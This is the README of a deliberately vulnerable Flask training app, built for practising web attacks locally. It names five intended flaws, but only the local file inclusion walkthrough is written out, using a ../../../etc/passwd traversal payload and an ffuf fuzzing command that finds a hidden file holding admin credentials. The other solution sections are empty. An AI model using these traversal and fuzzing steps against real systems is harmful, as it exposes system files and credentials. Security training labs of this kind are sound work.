# vulnerable-WebApp

A deliberately vulnerable web application built with Flask, MySQL, and Docker.  
This project is designed for learning, practicing, and demonstrating common web security vulnerabilities and their mitigations in a realistic environment.

## 🚀 Quick Start

```bash
docker compose up -d
```

- The application will be available at: `http://127.0.0.1:8000` 

## 🔐 WebApp Design  
  
- There are currently **4 different ways** to gain access to a privileged account.  
- Once you have privileged access, there is **1 method** to achieve a reverse shell.  
- Below you will find explanations and solutions for all **5 vulnerabilities**.

## 🧪 Exploitation & Solutions

- the **4 different ways** are: `LFI`, `Stored XSS`, `User Enumeration + Brute Force` and `SQL Injection`

### SQL Injection: 


### LFI: 
> [!Tip]  
> The application might expose more files than intended. Try exploring common directories.

- on the home page you can see a **gallery preview** 
- if you press on one of the images, the image will open up in a bigger preview: 

![LFI_1](docs/images/LFI_1.png)

- if you look at the `url` you can see that the `GET`-parameter: `view` is accepting input 
- if you now change the input to `../../../etc/passwd` you can see the content of the `passwd` file: 

![LFI_2](docs/images/LFI_2.png)
- let's take a look at the / directory
- we can use `ffuf` to fuzz for files: 
```bash
ffuf -u http://127.0.0.1:8000/home?view=../../../FUZZ -w /usr/share/SecLists/Discovery/Web-Content/raft-small-words.txt -H "Cookie: session=<your current cookie>" -fs 11
```
- for the `wordlist` I used `raft-small-words.txt` from `Seclists` 
- `FUZZ` is replaced by entries from the wordlist to discover hidden files

```bash

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://127.0.0.1:8000/home?view=../../../FUZZ
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/Web-Content/raft-small-words.txt
 :: Header           : Cookie: session=eyJtb2RlIjoidW5zZWN1cmUiLCJyb2xlIjoiZ3Vlc3QifQ.adZzfg.mNLteZ0udpWeNtS3NYviWpz4LZA
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 11
________________________________________________

<Redacted>            [Status: 200, Size: 14, Words: 1, Lines: 2, Duration: 68ms]
```
- `ffuf` discovered a hidden file in the root directory  
- accessing this file reveals credentials for the admin account  
- this demonstrates how LFI can lead to sensitive data exposure

### Stored XSS: 


### User Enumeration + Brute Force


- after you got access to an privileged account, there is an `RCE` vulnerabilities in the `Dashboard`

### RCE: 




## ⚠️ Disclaimer  
This project is intended for educational purposes only.  
Do not deploy it in production or expose it to the public internet.